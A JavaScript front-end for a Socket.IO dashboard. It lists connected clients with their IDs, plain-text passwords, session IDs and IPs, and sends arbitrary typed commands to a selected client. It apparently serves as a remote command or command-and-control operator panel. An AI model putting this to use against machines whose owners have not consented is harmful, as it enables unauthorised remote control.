// When document is ready.
document.addEventListener("DOMContentLoaded", function (event) {
  var socket = io("http://127.0.0.1:5000");

  // When someone connect to the socket.
  socket.on("connect", function () {
    socket.send("User has connected !");
  });

  socket.on("output_from_client_to_web", function (message) {
    document.getElementById("output_from_client").innerHTML = message;
  });

  
  socket.on("update_connections_list", function (connection_list) {
    document.getElementById("connected_clients").innerHTML = "";
    console.clear();
    console.log("The number of clients : " + connection_list.length);
    socket.emit("")

    let connected_clients_table = document.getElementById("connected_clients");

    for (let i = 0; i < connection_list.length; i++) {
      let new_table_row = document.createElement("tr");

      // /* Clipboard */
      let icon = document.createElement("i");
      icon.classList.add("fa");
      icon.classList.add("fa-clipboard");
      icon.addEventListener("mousedown", function () {
        let fetched_client_ID = this.parentElement.parentElement.children[0]
          .innerHTML;
        document.getElementById("client_ID").value = fetched_client_ID;
      });
      let icon_head = document.createElement("th");
      icon_head.appendChild(icon);

      /* Client ID Node */
      let client_ID_node = document.createElement("td");
      let client_ID_text_node = document.createTextNode(
        connection_list[i]["client_ID"]
      );
      client_ID_node.appendChild(client_ID_text_node);

      /* Password Node */
      let password_node = document.createElement("td");
      let password_text_node = document.createTextNode(
        connection_list[i]["password"]
      );
      password_node.appendChild(password_text_node);

      /* Client Session ID Node */
      let client_Session_ID_node = document.createElement("td");
      let client_Session_ID_text_node = document.createTextNode(
        connection_list[i]["client_Session_ID"]
      );
      client_Session_ID_node.appendChild(client_Session_ID_text_node);

      /* CLient IP Node */
      let client_IP_node = document.createElement("td");
      let client_IP_text_node = document.createTextNode(
        connection_list[i]["client_IP"][0]
      );
      client_IP_node.appendChild(client_IP_text_node);

      /* Append to table Action */
      new_table_row.append(client_ID_node);
      new_table_row.append(icon_head);
      new_table_row.append(password_node);
      new_table_row.append(client_Session_ID_node);
      new_table_row.append(client_IP_node);

      connected_clients.appendChild(new_table_row);
      // END UPDATE CONNECTION SOCKET
    }
  });

  // When send button is clicked.
  var send_command = io("http://127.0.0.1:5000/command");
  document.getElementById("sendCommand").addEventListener("click", function () {
    let client_ID = document.getElementById("client_ID").value;
    let command = document.getElementById("command").value;

    send_command.emit("command_from_web", {
      client_ID: client_ID,
      command: command,
    });
  });

  function getFirstTdContent(row) {
    elem = row.children[0];
    alert(elem.textContent); // Do whatever you want to do with the content here
  }

  // TODO Disconnect a particular client from server
  // document.getElementById("#disconnect_action").addEventListener("click", function(){
  //   socket.emit("disconnect_action");
  // });

  // To show table is empty.
  let table_content_length = document.getElementById("clients_list").rows
    .length;
  console.log(table_content_length);

  // END DOCUMENT READY
});
